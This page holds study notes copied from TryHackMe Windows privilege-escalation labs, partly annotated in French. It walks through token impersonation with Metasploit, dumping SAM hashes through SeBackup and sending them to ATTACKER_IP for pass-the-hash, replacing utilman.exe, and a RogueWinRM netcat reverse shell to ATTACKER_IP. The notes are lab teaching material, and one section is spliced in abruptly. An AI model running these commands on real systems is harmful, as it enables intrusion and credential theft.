    <body><div class='page'><h1 class='title'>Windows Privileges</h1><br/>  View all the privileges using whoami /priv<br />  <br />  You can see that two  privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let&#39;s  use the incognito module that will allow us to exploit this  vulnerability. Enter: <em>load incognito </em>to load the incognito module in metasploit. Please note, you may need to use the <em>use incognito </em>command if the previous command doesn&#39;t work. Also ensure that your metasploit is up to date.<br /><br /><br />Here are the most commonly abused privileges:<br />• SeImpersonatePrivilege<br />• SeAssignPrimaryPrivilege<br />• SeTcbPrivilege<br />• SeBackupPrivilege<br />• SeRestorePrivilege<br />• SeCreateTokenPrivilege<br />• SeLoadDriverPrivilege<br />• SeTakeOwnershipPrivilege<br />• SeDebugPrivilege<br /><br /><br /> <br /> To check which tokens are available, enter the <em><strong>list_tokens -g</strong></em>. We can see that the <em>BUILTIN\Administrators</em> token is available. Use the <em><strong>impersonate_token &quot;BUILTIN\Administrators&quot;</strong></em> command to impersonate the Administrators token. What is the output when you run the <em><strong>getuid</strong></em> command?<br />                                                        <br />  Even though you have a higher  privileged token you may not actually have the permissions of a  privileged user (this is due to the way Windows handles permissions - it  uses the Primary Token of the process and not the impersonated token to  determine what the process can or cannot do). Ensure that you <strong>migrate </strong> to a process with correct permissions (above questions answer). The  safest process to pick is the services.exe process. First use the <em><strong>ps</strong></em><em> </em>command to view processes and find the PID of the services.exe process. Migrate to this process using the command <em>migrate PID-OF-PROCESS</em><br />                            <br />                        <br />                          <br />                        Infos utiles:<br /><a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens">https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens</a><br /><a href="https://www.exploit-db.com/papers/42556">https://www.exploit-db.com/papers/42556</a><br />                                                                           <br /><br /><br /><br /><br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><br /><br /><br /><br />Each user has a set of assigned privileges that can be checked with the following command:<br /><code>whoami /priv</code>A complete list of available privileges on Windows systems is available <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">here</a>.  From an attacker&#39;s standpoint, only those privileges that allow us to  escalate in the system are of interest. You can find a comprehensive  list of exploitable privileges on the <a href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a> Github project.<br />While we won&#39;t take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.<br /><br /><br /><br /><h2>SeBackup / SeRestore</h2><br />The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL  in place. The idea behind this privilege is to allow certain users to  perform backups from a system without requiring full administrative  privileges.<br />Having this power, an attacker can trivially escalate privileges on  the system by using many techniques. The one we will look at consists of  copying the SAM and SYSTEM registry hives to extract the local  Administrator&#39;s password hash.<br />Log in to the target machine via RDP using the following credentials:<br /><strong>User:</strong> <code>THMBackup</code> <br /><strong>Password: </strong><code>CopyMaster555</code><br />This account is part of the &quot;Backup Operators&quot; group, which by  default is granted the SeBackup and SeRestore privileges. We will need  to open a command prompt using the &quot;Open as administrator&quot; option to use  these privileges. We will be asked to input our password again to get  an elevated console:<br /><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/befb434f15dbd4deee0654f8b6ef6de0.png"><img src="images/30-1.png" alt="images/30-1.png" /></a><br /><br />Once on the command prompt, we can check our privileges with the following command:<br />                        Command Prompt        <br />        <code>C:\&gt; whoami /priv<br /><br />PRIVILEGES INFORMATION<br />----------------------<br /><br />Privilege Name                Description                    State<br />============================= ============================== ========<br />SeBackupPrivilege             Back up files and directories  Disabled<br />SeRestorePrivilege            Restore files and directories  Disabled<br />SeShutdownPrivilege           Shut down the system           Disabled<br />SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br />SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code><br />            <br /><br />To backup the SAM and SYSTEM hashes, we can use the following commands:<br />                        Command Prompt        <br />        <code>C:\&gt; reg save hklm\system C:\Users\THMBackup\system.hive<br />The operation completed successfully.<br /><br />C:\&gt; reg save hklm\sam C:\Users\THMBackup\sam.hive<br />The operation completed successfully.</code><br />            <br /><br />This will create a couple of files with the registry hives content.  We can now copy these files to our attacker machine using SMB or any  other available method. For SMB, we can use impacket&#39;s <code>smbserver.py</code> to start a simple SMB server with a network share in the current directory of our AttackBox:<br />                         Kali Linux         <br />        <code>user@attackerpc$ mkdir share<br />user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share</code>            <br /><br />This will create a share named <code>public</code> pointing to the <code>share</code> directory, which requires the username and password of our current windows session. After this, we can use the <code>copy</code> command in our windows machine to transfer both files to our AttackBox: <br />                        Command Prompt        <br />        <code>C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\<br />C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\<br /></code><br />            <br /><br />And use impacket to retrieve the users&#39; password hashes:<br />                         Kali Linux         <br />        <code>user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL<br />Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation<br /><br />[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821<br />[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br />Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::<br />Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br /><br /></code><br />            <br /><br />We can finally use the Administrator&#39;s hash to perform a  Pass-the-Hash attack and gain access to the target machine with SYSTEM  privileges:<br />                         Kali Linux         <br />        <code>user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP<br />Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation<br /><br />[*] Requesting shares on 10.10.175.90.....<br />[*] Found writable share ADMIN$<br />[*] Uploading file nfhtabqO.exe<br />[*] Opening SVCManager on 10.10.175.90.....<br />[*] Creating service RoLE on 10.10.175.90.....<br />[*] Starting service RoLE.....<br />[!] Press help for extra shell commands<br />Microsoft Windows [Version 10.0.17763.1821]<br />(c) 2018 Microsoft Corporation.

For this task, we will be taking a different  route, however.<br />Log in to the target machine via RDP using the following credentials:<br /><strong>User:</strong> <code>THMTakeOwnership</code> <br /><strong>Password:</strong> <code>TheWorldIsMine2022</code><br />To get the SeTakeOwnership privilege, we need to open a command  prompt using the &quot;Open as administrator&quot; option. We will be asked to  input our password to get an elevated console:<br /><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33303d0cde736589d2838ee894379ff2.png"><img src="images/30-2.png" alt="images/30-2.png" /></a><br /><br />Once on the command prompt, we can check our privileges with the following command:<br />                        Command Prompt        <br />        <code>C:\&gt; whoami /priv<br /><br />PRIVILEGES INFORMATION<br />----------------------<br /><br />Privilege Name                Description                              State<br />============================= ======================================== ========<br />SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled<br />SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled<br />SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled</code><br />            <br /><br />We&#39;ll abuse <code>utilman.exe</code> to escalate privileges this  time. Utilman is a built-in Windows application used to provide Ease of  Access options during the lock screen:<br /><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png"><img src="images/30-3.png" alt="images/30-3.png" /></a><br /><br />Since Utilman is run with SYSTEM privileges, we will effectively gain  SYSTEM privileges if we replace the original binary for any payload we  like. As we can take ownership of any file, replacing it is trivial.<br />To replace utilman, we will start by taking ownership of it with the following command:<br />                        Command Prompt        <br />        <code>C:\&gt; takeown /f C:\Windows\System32\Utilman.exe<br /><br />SUCCESS: The file (or folder): &quot;C:\Windows\System32\Utilman.exe&quot; now owned by user &quot;WINPRIVESC2\thmtakeownership&quot;.</code><br />            <br /><br />Notice that being the owner of a file doesn&#39;t necessarily mean that  you have privileges over it, but being the owner you can assign yourself  any privileges you need. To give your user full permissions over  utilman.exe you can use the following command:<br />                        Command Prompt        <br />        <code>C:\&gt; icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F<br />processed file: Utilman.exe<br />Successfully processed 1 files; Failed processing 0 files</code><br />            <br /><br />After this, we will replace utilman.exe with a copy of cmd.exe:<br />                        Command Prompt        <br />        <code>C:\Windows\System32\&gt; copy cmd.exe utilman.exe<br />        1 file(s) copied.</code><br />            <br /><br />To trigger utilman, we will lock our screen from the start button:<br /><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png"><img src="images/30-4.png" alt="images/30-4.png" /></a><br /><br />And finally, proceed to click on the &quot;Ease of Access&quot; button, which  runs utilman.exe with SYSTEM privileges. Since we replaced it with a  cmd.exe copy, we will get a command prompt with SYSTEM privileges:<br /><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png"><img src="images/30-5.png" alt="images/30-5.png" /></a><br /><br /><br /><br /><br /><h2>SeImpersonate / SeAssignPrimaryToken</h2><br />These privileges allow a process to impersonate other users and act  on their behalf. Impersonation usually consists of being able to spawn a  process or thread under the security context of another user.<br />Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.<br />Let&#39;s assume we have an FTP service running with user <code>ftp</code>. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann&#39;s:<br /><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e5768172fbb97d6777dde7e15a3fcfc.png"><img src="images/30-6.png" alt="images/30-6.png" /></a><br /><br /><br />There are several reasons why using ftp&#39;s token is not the best idea:  - For the files to be served correctly, they would need to be  accessible to the <code>ftp</code> user. In the example above, the FTP service would be able to access Ann&#39;s files, but not Bill&#39;s files, as the DACL in Bill&#39;s files doesn&#39;t allow user <code>ftp</code>.  This adds complexity as we must manually configure specific permissions  for each served file/directory. - For the operating system, all files  are accessed by user <code>ftp</code>, independent of which user is currently logged in to the FTP  service. This makes it impossible to delegate the authorisation to the  operating system; therefore, the FTP service must implement it. - If the  FTP service were compromised at some point, the attacker would  immediately gain access to all of the folders to which the <code>ftp</code> user has access.<br />If, on the other hand, the FTP  service&#39;s user has the SeImpersonate or SeAssignPrimaryToken privilege,  all of this is simplified a bit, as the FTP service can temporarily  grab the access token of the user logging in and use it to perform any  task on their behalf:<br /><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89e74e14454edc10fa2bd541ac359772.png"><img src="images/30-7.png" alt="images/30-7.png" /></a><br /><br />Now, if user Ann logs in to the FTP  service and given that the ftp user has impersonation privileges, it  can borrow Ann&#39;s access token and use it to access her files. This way,  the files don&#39;t need to provide access to user <code>ftp</code> in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won&#39;t be able to access Jude&#39;s or Bill&#39;s files during that session.<br />As attackers, if we manage to take control of a process with  SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any  user connecting and authenticating to that process.<br />In Windows systems, you will find that the LOCAL SERVICE and NETWORK  SERVICE ACCOUNTS already have such privileges. Since these accounts are  used to spawn services using restricted accounts, it makes sense to  allow them to impersonate connecting users if the service needs.  Internet Information Services (IIS) will also create a similar default  account called &quot;iis apppool\defaultapppool&quot; for web applications.<br />To elevate privileges using such accounts, an attacker needs the  following: 1. To spawn a process so that users can connect and  authenticate to it for impersonation to occur. 2. Find a way to force  privileged users to connect and authenticate to the spawned malicious  process.<br />We will use RogueWinRM exploit to accomplish both conditions.<br />Let&#39;s start by assuming we have already compromised a website running  on IIS and that we have planted a web shell on the following address:<br /><code>http://MACHINE_IP/</code><br />We can use the web shell to check for the assigned privileges of the  compromised account and confirm we hold both privileges of interest for  this task:<br /><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png"><img src="images/30-8.png" alt="images/30-8.png" /></a><br /><br />To use RogueWinRM, we first need to upload the exploit to the target  machine. For your convenience, this has already been done, and you can  find the exploit in the <code>C:\tools\</code> folder.<br />The RogueWinRM exploit is possible because whenever a user (including  unprivileged users) starts the BITS service in Windows, it  automatically creates a connection to port 5985 using SYSTEM privileges.  Port 5985 is typically used for the WinRM service, which is simply a  port that exposes a Powershell console to be used remotely through the  network. Think of it like SSH, but using Powershell.<br />If, for some reason, the WinRM service isn&#39;t running on the victim  server, an attacker can start a fake WinRM service on port 5985 and  catch the authentication attempt made by the BITS service when starting.  If the attacker has SeImpersonate privileges, he can execute any  command on behalf of the connecting user, which is SYSTEM.<br />Before running the exploit, we&#39;ll start a netcat listener to receive a reverse shell on our attacker&#39;s machine:<br />                         Kali Linux         <br />        <code>user@attackerpc$ nc -lvp 4442</code><br />            <br /><br />And then, use our web shell to trigger the RogueWinRM exploit using the following command:<br /><code>c:\tools\RogueWinRM\RogueWinRM.exe -p &quot;C:\tools\nc64.exe&quot; -a &quot;-e cmd.exe ATTACKER_IP 4442&quot;</code><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png"><img src="images/30-9.png" alt="images/30-9.png" /></a><br /><br /><strong>Note:</strong> The exploit may take up to 2 minutes to work,  so your browser may appear as unresponsive for a bit. This happens if  you run the exploit multiple times as it must wait for the BITS service  to stop before starting it again. The BITS service will stop  automatically after 2 minutes of starting.<br />The <code>-p</code> parameter specifies the executable to be run by the exploit, which is <code>nc64.exe</code> in this case. The <code>-a</code>  parameter is used to pass arguments to the executable. Since we want  nc64 to establish a reverse shell against our attacker machine, the  arguments to pass to netcat will be <code>-e cmd.exe ATTACKER_IP 4442</code>.<br />If all was correctly set up, you should expect a shell with SYSTEM privileges:<br />                         Kali Linux         <br />        <code>user@attackerpc$ nc -lvp 4442<br />Listening on 0.0.0.0 4442<br />Connection received on 10.10.175.90 49755<br />Microsoft Windows [Version 10.0.17763.1821]<br />(c) 2018 Microsoft Corporation.
